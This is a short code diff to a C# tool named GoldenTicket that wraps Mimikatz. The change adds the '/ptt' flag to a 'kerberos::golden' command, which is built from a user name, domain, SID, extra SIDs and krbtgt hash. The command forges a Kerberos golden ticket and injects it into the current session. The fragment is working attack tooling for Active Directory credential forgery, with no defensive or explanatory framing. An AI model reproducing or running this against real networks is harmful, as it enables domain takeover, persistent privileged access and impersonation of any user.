@@ -16,7 +16,7 @@ namespace GoldenTicket
             }
             try
             {
-                var cmd = $"\"kerberos::golden /user:{args[0]} /domain:{args[1]} /sid:{args[2]} /sids:{args[3]} /krbtgt:{args[4]}\" \"exit\"";
+                var cmd = $"\"kerberos::golden /user:{args[0]} /domain:{args[1]} /sid:{args[2]} /sids:{args[3]} /krbtgt:{args[4]} /ptt\" \"exit\"";
                 var mimi = Mimikatz.Command(cmd);
                 Console.WriteLine(mimi);
             }
